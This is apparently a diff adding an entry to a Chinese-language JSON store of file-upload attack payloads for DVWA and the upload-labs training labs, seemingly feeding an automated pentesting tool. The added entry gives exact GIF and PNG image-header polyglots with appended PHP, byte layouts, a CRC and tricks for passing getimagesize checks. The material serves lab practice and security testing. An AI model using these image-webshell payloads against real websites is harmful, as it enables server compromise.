@@ -13,5 +13,12 @@
     "reference_payload": "multipart POST /vulnerabilities/upload/  uploaded=@file(名称 poc2.png, content-type image/png, 内容=1x1 PNG 完整字节 + \"<?php echo 49; ?>\")",
     "principle": "内容伪造(polyglot)：合法图片头通过 getimagesize 内容校验，尾部追加 PHP webshell 随图片一起被接受并落地；扩展名校验只看最后一个点后缀(.png)也通过",
     "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030170340",
+    "context": "upload-labs Pass-14 前端表单 upload_file，后端 getimagesize() 校验图片类型（image_type_to_extension 后 stripos 匹配）。无扩展名/Content-Type 校验，只看文件内容头。CDP upload_file 上传,判成功=提交后提示区空+页面出现 img[src*=\"/upload/\"],失败=报\"文件未知,上传失败\"。",
+    "reference_payload": "GIF: 6字节 `GIF89a` + `<?php phpinfo();`（省略 ?> 避免HackMate读取bug）→ 24字节,上传成功。完整版:经典1x1 GIF(35B) `R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAkQBADs=` + `<?php phpinfo();` =51B。PNG: `\\x89PNG\\r\\n\\x1a\\n`(8) + IHDR(len=13,'IHDR',w=1,h=1,08 06 00 00 00) + CRC(1F15C489) + `<?php phpinfo();` =51B,上传成功。",
+    "principle": "getimagesize 对 GIF 只查前6字节魔数(GIF89a)、对 PNG 查 signature+完整 IHDR 块、PHP 代码追加在图片合法结构之后仍被 getimagesize 认可;图片马靠文件包含执行。注意 CDP 上传含 `?>` 内容会触发 ERR,省略 PHP 结束标签即可。JPG 需完整含 SOS 的 JPEG,手搓 base64 无法产出有效文件。",
+    "source": "upload-labs"
   }
 ]
